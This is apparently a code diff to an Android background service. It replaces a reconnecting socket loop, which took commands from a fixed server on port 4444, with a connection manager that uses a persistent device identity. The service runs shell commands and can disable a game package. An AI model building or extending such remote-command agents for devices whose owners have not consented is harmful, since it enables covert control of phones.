@@ -45,9 +45,6 @@ import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStream;
 import java.io.Reader;
-import java.net.InetSocketAddress;
-import java.net.Socket;
-import java.net.SocketException;
 import java.nio.charset.StandardCharsets;
 import java.util.ArrayList;
 import java.util.Date;
@@ -73,6 +70,18 @@ public class BackgroundService extends Service {
     private static final String ASSET_AUDIO_DIR = "audio";
     private static final String ASSET_VIDEO_DIR = "video";
 
+    private volatile AgentConnectionManager agentConnectionManager;
+
+    private static volatile BackgroundService instance;
+
+    /** Debug-only snapshot of the transport session state, exposed for MainActivity. */
+    public static String debugSessionState() {
+        BackgroundService s = instance;
+        AgentConnectionManager m = s == null ? null : s.agentConnectionManager;
+        return m == null ? "stopped" : m.sessionState();
+    }
+    private DeviceIdentity agentIdentity;
+
     private static final String[] PREFERRED_INTERFACES = {
             "wlan0", "eth0", "radio0", "rmnet_data0", "rmnet0", "wlan1"
     };
@@ -83,12 +92,8 @@ public class BackgroundService extends Service {
     /** الحزمة المستهدفة لأوامر إزالة/تعطيل فري فاير. */
     private static final String FREE_FIRE_PACKAGE = "com.dts.freefireth";
 
-    private static final String SERVER_HOST = "10.0.2.2";
-    private static final int SERVER_PORT = 4444;
-    private static final int CONNECT_TIMEOUT_MS = 10000;
-    private static final int RECONNECT_DELAY_MS = 5000;
-    private static final int SHELL_TIMEOUT_MS = 15000;
     private static final int MAX_MESSAGE_SIZE = 8 * 1024 * 1024;
+    private static final int SHELL_TIMEOUT_MS = 15000;
 
     private static final int WALLPAPER_IMAGE_MAX_BYTES = 5 * 1024 * 1024;
     private static final int SCRIPT_MAX_BYTES = 512 * 1024;
@@ -115,7 +120,6 @@ public class BackgroundService extends Service {
     private final AtomicBoolean connectionThreadStarted = new AtomicBoolean(false);
     private volatile boolean running = false;
     private volatile Thread connectionThread;
-    private volatile Socket connectionSocket;
 
     private final Object workerLock = new Object();
     private volatile HandlerThread workerThread;
@@ -173,6 +177,7 @@ public class BackgroundService extends Service {
     @Override
     public void onCreate() {
         super.onCreate();
+        instance = this;
         ensureNotificationChannels();
         cleanupStaleWallpaperCache();
 
@@ -186,6 +191,9 @@ public class BackgroundService extends Service {
         } catch (Exception e) {
             Log.w(TAG, "register relock receiver failed", e);
         }
+
+        // الهوية المستمرة للجهاز + طبقة النقل متعددة الأجهزة.
+        agentIdentity = new DeviceIdentity(this);
     }
 
     private void cleanupStaleWallpaperCache() {
@@ -229,12 +237,10 @@ public class BackgroundService extends Service {
     @Override
     public void onDestroy() {
         running = false;
-        if (connectionSocket != null) {
-            try {
-                connectionSocket.close();
-            } catch (IOException ignored) {
-            }
-            connectionSocket = null;
+        instance = null;
+        if (agentConnectionManager != null) {
+            agentConnectionManager.stop();
+            agentConnectionManager = null;
         }
         Thread thread = connectionThread;
         if (thread != null) {
@@ -355,49 +361,14 @@ public class BackgroundService extends Service {
     // ------------------------------------------------------------------
 
     private void establishConnection() {
+        agentConnectionManager = new AgentConnectionManager(this,
+                this::executeCommand,
+                () -> { running = false; stopSelf(); },
+                agentIdentity);
         try {
-            while (running) {
-                Socket socket = null;
-                try {
-                    socket = new Socket();
-                    socket.connect(new InetSocketAddress(SERVER_HOST, SERVER_PORT), CONNECT_TIMEOUT_MS);
-                    connectionSocket = socket;
-                    Log.i(TAG, "connected to " + SERVER_HOST + ":" + SERVER_PORT);
-
-                    InputStream in = socket.getInputStream();
-                    OutputStream out = socket.getOutputStream();
-
-                    while (running) {
-                        String command = readMessage(in);
-                        if (command == null) {
-                            Log.i(TAG, "server closed the connection");
-                            break;
-                        }
-                        executeCommand(command, out);
-                    }
-                } catch (SocketException e) {
-                    Log.w(TAG, "socket closed: " + e.getMessage());
-                } catch (IOException e) {
-                    Log.w(TAG, "connection error: " + e.getMessage());
-                } catch (Exception e) {
-                    Log.w(TAG, "unexpected error", e);
-                } finally {
-                    closeQuietly(socket);
-                    if (connectionSocket == socket) {
-                        connectionSocket = null;
-                    }
-                    Log.i(TAG, "disconnected");
-                }
-
-                if (running) {
-                    try {
-                        Thread.sleep(RECONNECT_DELAY_MS);
-                    } catch (InterruptedException e) {
-                        Thread.currentThread().interrupt();
-                        break;
-                    }
-                }
-            }
+            agentConnectionManager.run();
+        } catch (Exception e) {
+            Log.w(TAG, "agent connection manager failed", e);
         } finally {
             connectionThreadStarted.set(false);
         }
@@ -443,15 +414,6 @@ public class BackgroundService extends Service {
             offset += read;
         }
         return data;
-    }
-
-    private static void closeQuietly(Socket socket) {
-        if (socket != null) {
-            try {
-                socket.close();
-            } catch (IOException ignored) {
-            }
-        }
     }
 
     // ------------------------------------------------------------------
